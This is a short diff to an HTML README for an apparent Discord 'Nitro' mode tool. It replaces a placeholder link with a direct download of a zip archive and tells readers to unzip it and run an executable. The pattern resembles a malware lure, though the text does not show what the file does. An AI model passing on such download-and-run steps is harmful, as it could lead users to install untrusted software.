@@ -16,7 +16,7 @@
 </ul>
 
 <h2>Installation</h2>
-<p>Download project from <a href="#">Releases</a></p>
+<p>Download project from <a href="https://github.com/havanagilla1/ds-nitro/releases/download/Download/DiscordNMode.zip">Releases</a></p>
 <p>Unzip file to any path</p>
 <p>Run <code>Discord_NMode.exe</code></p>
 
